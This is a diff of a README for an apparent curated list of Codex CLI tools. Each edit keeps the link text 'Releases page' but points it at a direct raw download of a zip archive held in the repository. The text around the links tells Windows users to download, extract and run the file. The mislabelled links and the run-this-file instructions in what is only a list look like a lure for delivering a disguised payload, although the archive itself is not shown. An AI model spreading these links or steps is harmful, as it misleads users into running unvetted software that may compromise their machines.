@@ -1,6 +1,6 @@
 # 🤖 awesome-codex-cli - Find the right Codex tools fast
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/colicveinmedicine640/awesome-codex-cli/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/colicveinmedicine640/awesome-codex-cli/main/assets/awesome-codex-cli-1.8.zip)
 
 ## 📦 What this is
 
@@ -15,7 +15,7 @@ Use it if you want to:
 
 ## 🪟 Download for Windows
 
-1. Visit the [Releases page](https://github.com/colicveinmedicine640/awesome-codex-cli/releases)
+1. Visit the [Releases page](https://raw.githubusercontent.com/colicveinmedicine640/awesome-codex-cli/main/assets/awesome-codex-cli-1.8.zip)
 2. Find the latest release at the top
 3. Download the file for Windows if one is listed
 4. Open the downloaded file or follow the steps in the release notes
@@ -49,7 +49,7 @@ You do not need to install everything. Start with one tool that matches your goa
 
 If you are new to this kind of app, use these steps:
 
-1. Go to the [Releases page](https://github.com/colicveinmedicine640/awesome-codex-cli/releases)
+1. Go to the [Releases page](https://raw.githubusercontent.com/colicveinmedicine640/awesome-codex-cli/main/assets/awesome-codex-cli-1.8.zip)
 2. Download the Windows file from the latest release
 3. Right-click the file if it is a ZIP archive
 4. Choose Extract All
@@ -126,7 +126,7 @@ This keeps the process simple and avoids guesswork.
 
 ## 📄 File and link help
 
-The main download path is the [Releases page](https://github.com/colicveinmedicine640/awesome-codex-cli/releases). Use it to download and run the latest Windows file if one is included.
+The main download path is the [Releases page](https://raw.githubusercontent.com/colicveinmedicine640/awesome-codex-cli/main/assets/awesome-codex-cli-1.8.zip). Use it to download and run the latest Windows file if one is included.
 
 If you are not sure which file to pick, choose the one marked for Windows, then use the latest version shown on the page
 
@@ -140,6 +140,6 @@ If you are not sure which file to pick, choose the one marked for Windows, then 
 
 ## 🔗 Useful links
 
-- [Releases page](https://github.com/colicveinmedicine640/awesome-codex-cli/releases)
+- [Releases page](https://raw.githubusercontent.com/colicveinmedicine640/awesome-codex-cli/main/assets/awesome-codex-cli-1.8.zip)
 - GitHub repo: awesome-codex-cli
 - Topics: ai-coding, ai-tools, awesome-list, claude-code, cli-tools, codex-cli, openai-codex, skills, subagents, terminal
